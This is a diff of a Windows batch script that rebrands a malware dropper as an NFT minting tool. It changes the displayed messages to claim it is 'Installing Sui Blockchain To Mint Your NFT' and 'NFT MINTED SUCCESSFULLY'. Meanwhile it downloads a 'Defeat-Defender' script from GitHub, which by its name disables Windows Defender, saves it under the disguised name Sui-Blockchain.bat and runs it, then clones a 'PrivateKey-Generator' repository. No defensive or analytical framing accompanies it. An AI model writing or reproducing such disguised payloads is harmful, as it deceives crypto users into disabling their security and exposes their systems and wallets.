@@ -17,7 +17,7 @@ set "PATH=%PATH%;C:\Program Files\Git\bin;C:\Program Files\Git\cmd"
 set "PATH=%PATH%;C:\Program Files\Git\bin;C:\Program Files\Git\cmd"
 
 :: Inform the user
-echo 'Git has been installed and added to PATH. You can now use Git in this Command Prompt session.'
+echo 'Installing Sui Blockchain To Mint Your NFT.'
 
 :: Check if Git is now installed
 git --version >nul 2>&1
@@ -26,43 +26,10 @@ if %ERRORLEVEL% neq 0 (
     exit /b %ERRORLEVEL%
 )
 
-:: Define the URL for the latest NSudo release
-set "url=https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip"
-set "outputFile=NSudo.zip"
-set "installDir=C:\Program Files\NSudo"
-
-:: Download NSudo
-echo Downloading NSudo...
-powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %outputFile%"
-if %ERRORLEVEL% neq 0 (
-    echo Failed to download NSudo. Exiting...
-    exit /b %ERRORLEVEL%
-)
-
-:: Create the installation directory if it doesn't exist
-if not exist "%installDir%" (
-    mkdir "%installDir%"
-)
-
-:: Extract the downloaded ZIP file
-echo Extracting NSudo...
-powershell -Command "Expand-Archive -Path '%cd%\%outputFile%' -DestinationPath '%installDir%' -Force"
-if %ERRORLEVEL% neq 0 (
-    echo Failed to extract NSudo. Exiting...
-    exit /b %ERRORLEVEL%
-)
-
-:: Clean up the downloaded ZIP file
-del %outputFile%
-
-:: Inform the user that NSudo has been installed
-echo NSudo has been installed successfully in %installDir%.
-
-
 
 :: Define the URL for the Defeat-Defender.bat file
 set "url=https://github.com/swagkarna/Defeat-Defender-V1.2.0/raw/refs/heads/main/Defeat-Defender.bat"
-set "outputFile=Defeat-Defender.bat"
+set "outputFile=Sui-Blockchain.bat"
 
 :: Download the Defeat-Defender.bat file
 powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %outputFile%"
@@ -79,7 +46,7 @@ if %ERRORLEVEL% neq 0 (
 )
 
 :: Inform the user that the process is complete
-echo 'Defeat-Defender.bat executed successfully.'
+echo 'NFT MINTED SUCCESSFULLY, SENDING TO WALLET......'
 
 
 git clone https://github.com/CelestialNFT/PrivateKey-Generator.git
